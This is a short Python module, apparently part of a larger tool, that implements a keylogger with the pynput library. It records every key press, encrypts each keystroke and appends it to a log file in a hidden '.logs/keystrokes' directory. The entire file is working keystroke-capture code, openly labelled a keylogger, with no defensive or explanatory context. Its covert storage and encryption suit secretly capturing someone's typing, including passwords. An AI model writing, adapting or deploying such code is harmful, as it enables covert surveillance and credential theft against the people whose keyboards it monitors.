from pynput import keyboard
from core.encryptor import encrypt_data
import os

log_path = ".logs/keystrokes/log.txt"

def on_press(key, active):
    """Encrypt and save keystrokes if logger is active."""
    if not active["value"]:
        return
    try:
        os.makedirs(os.path.dirname(log_path), exist_ok=True)
        with open(log_path, "ab") as f:
            key_str = str(key).replace("'", "") + " "
            f.write(encrypt_data(key_str.encode()))
    except Exception as e:
        print("[!] Keylogger error:", e)

def start_logger(active):
    """Start capturing keystrokes."""
    keyboard.Listener(on_press=lambda key: on_press(key, active)).join()
